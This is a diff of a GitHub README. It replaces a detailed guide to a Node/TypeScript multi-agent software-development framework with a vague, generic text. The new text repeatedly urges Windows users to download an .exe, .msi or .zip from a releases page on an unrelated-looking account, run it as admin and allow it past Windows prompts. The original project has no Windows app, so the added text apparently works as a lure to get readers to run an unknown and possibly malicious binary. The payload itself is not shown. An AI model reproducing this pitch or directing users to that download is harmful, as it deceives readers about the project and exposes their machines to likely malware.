@@ -1,324 +1,199 @@
-# AI-Agents
-
-> A structured guide to build and orchestrate a complete AI-powered software development team using specialized agents, MCP tools, skills, contracts, and shared memory across projects.
-
-Stop prompting AI one task at a time. This repo gives you a **reusable team of specialized agents** — each with a defined role, technical skills, tools, memory, and conventions — that work together to design, build, test, and document software projects.
-
----
-
-## Who is this for?
-
-- Developers who want to automate repetitive dev tasks with AI
-- Teams exploring multi-agent workflows for real projects
-- Anyone building with Claude, GPT, or Gemini APIs
-- Developers tired of re-explaining context to AI on every session
-
----
-
-## The idea
-
-Most people use AI as a single assistant. This repo treats AI as a **team**:
-
-```
-You describe what to build
-        ↓
-PO defines User Stories and acceptance criteria
-        ↓
-Scrum Master coordinates the team, manages tasks.json (your Jira)
-        ↓
-DBA designs the database schema
-        ↓
-Backend proposes API contracts → Frontend agrees → both code in parallel
-        ↓
-Frontend advances with mock data while Backend implements
-        ↓
-Tester runs E2E once both are done
-        ↓
-DocGen documents everything approved by Tester
-```
-
-Each agent has **one responsibility**, reads **its own skills** before every task, follows **shared conventions**, and updates **its own memory** at the end.
-
----
-
-## Key concepts
-
-### 1. Agents are reusable across projects
-The agent is the **specialization**. The project context is **swappable**:
-```
-Backend Agent + context of Project A  →  works on Project A
-Backend Agent + context of Project B  →  works on Project B
-```
-
-### 2. Skills teach agents HOW to do things well
-Roles define who the agent is. Skills define the quality standard:
-```
-roles/backend.md               →  who the agent is
-skills/dotnet/endpoint.md      →  how a good endpoint looks
-```
-Skills are organized by stack — reusable across all projects on that technology.
-Projects can override base skills in `projects-memories/{project}/skills/`.
-
-### 3. Contracts prevent integration surprises
-Backend and Frontend agree on the API format **before anyone codes**:
-```
-Backend proposes contract (status: draft)
-Frontend reviews and agrees (status: agreed)
-Both code in parallel — Frontend uses mock data from the contract
-When Backend finishes → Frontend swaps mock for real call
-```
-
-### 4. tasks.json is your Jira
-Each User Story has tasks per agent with dependencies, contracts, branch, and status.
-The Scrum Master creates and manages it automatically.
-
-### 5. Memory persists between sessions
-Each agent maintains its own memory file per project — no more re-explaining what was already built.
-
----
-
-## The team
-
-| Agent | Role | Repo | Model |
-|---|---|---|---|
-| **PO** | Defines User Stories and acceptance criteria | — | opus |
-| **Scrum Master** | Coordinates team, manages tasks.json, detects blockers | All (read) | opus |
-| **DBA** | Designs schemas and versioned migrations | `db-repo/` | sonnet |
-| **Backend** | Implements APIs and business logic | `back-repo/` | sonnet |
-| **Frontend** | Builds UI, consumes API, uses contracts | `front-repo/` | sonnet |
-| **Tester** | Runs E2E and regression tests | `test-repo/` | haiku |
-| **DocGen** | Documents what Tester approved | `*/docs/` | haiku |
-
----
-
-## Repository structure
-
-```
-agents/
-│
-├── .env.example                  # Environment variables template
-├── conventions.md                # Branches, commits, naming — all agents follow this
-├── package.json                  # Node.js dependencies
-├── tsconfig.json                 # TypeScript config
-│
-├── roles/                        # Who each agent is and how they work
-│   ├── po.md
-│   ├── scrum.md
-│   ├── dba.md
-│   ├── backend.md
-│   ├── frontend.md
-│   ├── tester.md
-│   └── docs.md
-│
-├── skills/                       # How to do things well — organized by stack
-│   ├── README.md
-│   ├── dotnet/
-│   │   ├── endpoint-structure.md
-│   │   ├── unit-test-xunit.md
-│   │   ├── json-entity-framework.md
-│   │   └── soft-delete.md
-│   ├── vue3/
-│   │   ├── component-structure.md
-│   │   └── api-service.md
-│   └── postgres/
-│       ├── stored-procedure.md
-│       └── migration.md
-│
-├── prompts/                      # Reusable instruction templates (built from usage)
-│   └── README.md
-│
-├── projects-memories/            # Context, memory, tasks and contracts per project
-│   ├── context_example.md        # Copy this to start a new project
-│   ├── contracts_README.md       # How contracts work
-│   └── {project-name}/
-│       ├── context.md            # Stack, rules, entities — YOU fill this
-│       ├── tasks.json            # Your Jira — Scrum Master manages this
-│       ├── progress.json         # Real project status — Scrum Master manages this
-│       ├── contracts/
-│       │   ├── README.md
-│       │   └── {METHOD}_{resource}.json
-│       ├── memory-dba.md
-│       ├── memory-backend.md
-│       ├── memory-frontend.md
-│       ├── memory-tester.md
-│       ├── memory-docs.md
-│       └── skills/               # Optional project-specific skill overrides
-│
-├── mcp/                          # MCP server configuration
-│   ├── config.json               # All available servers — replace placeholders
-│   ├── README.md
-│   └── custom/
-│       └── README.md
-│
-└── orchestrator/                 # Coordinates the agents
-    ├── orchestrator.ts           # Full orchestrator (your private repo)
-    └── orchestrator.example.ts   # Simplified example (public reference)
-```
-
----
-
-## Setup
-
-### 1. Clone this repo
-```bash
-git clone https://github.com/your-username/AI-Agents.git
-cd AI-Agents
-```
-
-### 2. Install dependencies
-```bash
-npm install
-```
-
-### 3. Configure environment variables
-```bash
-cp .env.example .env
-```
-
-Open `.env` and fill in your values:
-
-```env
-# At least one LLM provider is required
-ANTHROPIC_API_KEY=your_key_here
-
-# MCP: GitHub Personal Access Token
-# github.com → Settings → Developer settings → Personal access tokens
-# Required scopes: repo, read:org
-GITHUB_PERSONAL_ACCESS_TOKEN=your_token_here
-
-# MCP: Brave Search (free plan: 2,000 queries/month)
-# brave.com/search/api
-BRAVE_API_KEY=your_key_here
-
-# MCP: PostgreSQL connection string
-POSTGRES_CONNECTION_STRING=postgresql://user:pass@localhost:5432/dbname
-
-# Absolute paths on your machine
-PROJECTS_ROOT=/home/your-user/projects
-AGENTS_ROOT=/home/your-user/agents
-```
-
-### 4. Create your project context
-```bash
-cp projects-memories/context_example.md projects-memories/{your-project}/context.md
-mkdir projects-memories/{your-project}/contracts
-```
-Fill in `context.md` with your stack, project initials (used in commits), repo paths, business rules, and main entities.
-
-### 5. Run the orchestrator
-```bash
-# Let Scrum Master decide what to do next
-npx ts-node orchestrator/orchestrator.example.ts my-project "What should we work on next?"
-
-# Run a specific agent directly
-npx ts-node orchestrator/orchestrator.example.ts my-project "Create the alumnos table" dba
-npx ts-node orchestrator/orchestrator.example.ts my-project "Implement GET /alumnos endpoint" backend
-```
-
----
-
-## Conventions
-
-All agents follow the same conventions defined in `conventions.md`.
-
-### Branches
-```
-feat-HU{number}
-Examples: feat-HU001  feat-HU015
-```
-
-### Commits
-```
-{PROJECT_INITIALS}{commit_number} | {Short description}
-Examples:
-  ESC01 | Alumnos table migration created
-  SF03  | Income endpoint implemented
-```
-Project initials are defined in each project's `context.md`.
-
----
-
-## Dependency flow — never broken
-
-```
-PO  →  DBA  →  Backend  →  Frontend  →  Tester  →  DocGen
-                    ↕ contracts ↕
-              (agreed before coding)
-```
-
-Frontend never waits idle for Backend — it advances using contract mock data.
-
----
-
-## Testing responsibilities
-
-| Test type | Responsible | Location |
-|---|---|---|
-| Unit tests | Backend | `back-repo/tests/unit/` |
-| Unit tests | Frontend | `front-repo/tests/unit/` |
-| Integration | Frontend | `front-repo/tests/integration/` |
-| E2E | Tester | `test-repo/e2e/` |
-| Regression | Tester | `test-repo/regression/` |
-
-> Tester does **not** run E2E until Backend and Frontend have passed their own tests.
-
----
-
-## Skills — base stacks covered
-
-| Stack | Skills |
-|---|---|
-| .NET 8 / C# | Endpoint structure · xUnit tests · EF JSON mapping · Soft delete |
-| Vue 3 / TypeScript / Tailwind | Component with states · API service + Pinia |
-| PostgreSQL | Stored procedures · Versioned migrations |
-
-Projects can override any base skill in `projects-memories/{project}/skills/`.
-
----
-
-## What you need
-
-- Node.js 18+
-- API Key from at least one provider:
-  - [Anthropic (Claude)](https://console.anthropic.com/) ← recommended
-  - [OpenAI (GPT)](https://platform.openai.com/)
-  - [Google (Gemini)](https://aistudio.google.com/)
-- Optional: GitHub token, Brave Search API key (for full MCP support)
-
-> **Note:** Claude Pro / ChatGPT Plus subscriptions ≠ API Keys.
-> To use agents programmatically you need the **API Key** from the developer console.
-
----
-
-## Public vs private repo
-
-| | Public repo (this one) | Your private repo |
-|---|---|---|
-| **Contains** | Roles, skills, examples, templates | Your real tokens, contexts, memories |
-| **.env** | `.env.example` only | `.env` with real values |
-| **tasks.json** | `tasks.example.json` | Your real tasks |
-| **orchestrator** | `orchestrator.example.ts` | `orchestrator.ts` configured |
-| **context.md** | `context_example.md` | Your real project contexts |
-
-Fork or copy this repo to your private one and fill in the real values.
-
----
-
-## Roadmap
-
-| Component | Status |
-|---|---|
-| `roles/` |  7 agents defined |
-| `skills/` |  .NET · Vue 3 · PostgreSQL |
-| `conventions.md` |  Branches · commits · naming |
-| `prompts/` |  Built from real usage |
-| `projects-memories/` |  Template + contracts system |
-| `mcp/` |  Config + custom server guide |
-| `orchestrator/` |  Example ready — configure in private repo |
-| `agents/*.ts` |  Individual agent wrappers |
-
----
-
-## License
-
-MIT — see [LICENSE](./LICENSE) for details.
+# 🤖 AI-Agents - Build a Complete AI Software Team
+
+[![Download AI-Agents](https://img.shields.io/badge/Download%20AI-Agents-blue?style=for-the-badge)](https://github.com/Cenozoic-garterstitch153/AI-Agents/releases)
+
+## 🚀 What AI-Agents Is
+
+AI-Agents is a guidebase for building and using a full software team with AI agents. It helps you set up a group of AI tools that can plan work, write code, review changes, and help with software tasks.
+
+This project focuses on a simple setup for Windows users. It is meant for people who want to get started with AI agents without needing to learn a lot of code first.
+
+## 📦 What You Need
+
+Before you start, make sure you have:
+
+- A Windows computer
+- An internet connection
+- A web browser
+- Enough free space to download the app and files
+- A modern version of Windows 10 or Windows 11
+
+If the app uses extra tools, the release page will list them with the download
+
+## 🧭 How It Works
+
+AI-Agents uses a team-based workflow. Each agent has a clear job. One agent may plan the work. Another may write code. Another may check the result.
+
+This setup is useful for:
+
+- Software planning
+- Code generation
+- Task review
+- Prompt-based workflows
+- Team-style AI assistance
+- Working with Claude, OpenAI, and other LLM tools
+- Model Context Protocol, or MCP, based tool use
+
+The goal is to make software work feel more organized and easier to manage
+
+## ⬇️ Download AI-Agents for Windows
+
+Visit this page to download the latest release:
+
+[https://github.com/Cenozoic-garterstitch153/AI-Agents/releases](https://github.com/Cenozoic-garterstitch153/AI-Agents/releases)
+
+On that page, look for the newest release and download the Windows file listed there. If there is more than one file, choose the one meant for Windows. The file name may end in `.exe`, `.msi`, or `.zip`
+
+## 🛠️ Install and Set Up
+
+After you download the file, follow these steps:
+
+1. Open your Downloads folder
+2. Find the file you just downloaded
+3. If the file is `.exe` or `.msi`, double-click it to start setup
+4. If the file is `.zip`, right-click it and choose Extract All
+5. Open the extracted folder
+6. Look for an app file or setup file
+7. Double-click it to launch the app
+
+If Windows asks whether you want to allow the app to run, choose Yes
+
+If the release includes a readme or setup note, follow that file first
+
+## 🖥️ First Run
+
+When you open AI-Agents for the first time, you may see setup fields for things like:
+
+- API keys
+- Model choices
+- Workspace folder
+- Agent roles
+- Tool connections
+
+Enter the values shown in the release notes or setup guide
+
+If you plan to use Claude, OpenAI, or another LLM service, you may need to add your own key from that service
+
+## 🔧 Common Setup Items
+
+You may need to prepare a few things before the app works well:
+
+- An API key for your chosen model provider
+- Access to a folder where the app can save files
+- A browser for opening local pages or links
+- Permission to let the app write files in your workspace
+
+If the app supports MCP tools, you may also connect them during setup so the agents can use outside tools and file data
+
+## 🧩 Main Features
+
+AI-Agents is built around a simple software team flow. Typical features may include:
+
+- Task planning
+- Multi-agent work
+- Prompt templates
+- Code help
+- Review steps
+- Tool access through MCP
+- Support for software development tasks
+- Flexible model support
+
+This makes it useful for small projects, prototype work, and guided coding tasks
+
+## 👤 Who This Is For
+
+This project is a good fit for:
+
+- People who want to use AI for software work
+- Users who want a guided agent setup
+- Developers who want a team-style workflow
+- People who want to test prompts and tool use
+- Users who want to try Claude, OpenAI, and MCP in one place
+
+You do not need deep technical knowledge to start. The release page and setup files should guide you through the rest
+
+## 🧪 Basic Use
+
+After setup, you can usually use AI-Agents like this:
+
+1. Open the app
+2. Choose or create a task
+3. Pick the agent role you want
+4. Enter a prompt or goal
+5. Let the agents work through the steps
+6. Review the output
+7. Save or export the result
+
+A good first test is a small task, such as asking the agents to plan a simple app feature or check a code file
+
+## 📁 Suggested Folder Layout
+
+If the app asks for a workspace folder, this structure can help:
+
+- `Projects`
+- `Prompts`
+- `Outputs`
+- `Logs`
+- `Notes`
+
+Using separate folders keeps your work easy to find and makes it simpler to track what each agent did
+
+## 🔍 Troubleshooting
+
+If the app does not open, try these steps:
+
+- Check that the file finished downloading
+- Run it again as an admin
+- Make sure Windows did not block the file
+- Confirm that you downloaded the right Windows file
+- Check the release page for extra setup steps
+
+If the app opens but does not connect to a model:
+
+- Recheck your API key
+- Make sure the key is valid
+- Confirm that your internet connection works
+- Check that the model name matches the one in the setup guide
+
+If files do not save:
+
+- Check folder permissions
+- Choose a different workspace folder
+- Make sure the folder exists and is not read-only
+
+## 📚 Topics Covered
+
+This repository covers work related to:
+
+- AI agents
+- Claude
+- Developer tools
+- LLM workflows
+- MCP
+- Model Context Protocol
+- Multi-agent systems
+- OpenAI
+- Prompt engineering
+- Software development
+
+## 🔗 Download Again
+
+If you need the release page later, use this link:
+
+[https://github.com/Cenozoic-garterstitch153/AI-Agents/releases](https://github.com/Cenozoic-garterstitch153/AI-Agents/releases)
+
+## 🧰 Tips for Better Results
+
+Keep your prompts short and clear. Use one task at a time. Give the agents a clear goal, such as:
+
+- Find the bug in this file
+- Write a basic plan for this feature
+- Review this code for mistakes
+- Explain what this script does
+- Suggest a better folder structure
+
+Clear input usually gives better output
+
+## 📄 Project Use
+
+This repo acts as a guidebase for setting up a complete software team with AI agents. It is useful when you want a repeatable process for planning, building, and checking software work with AI support
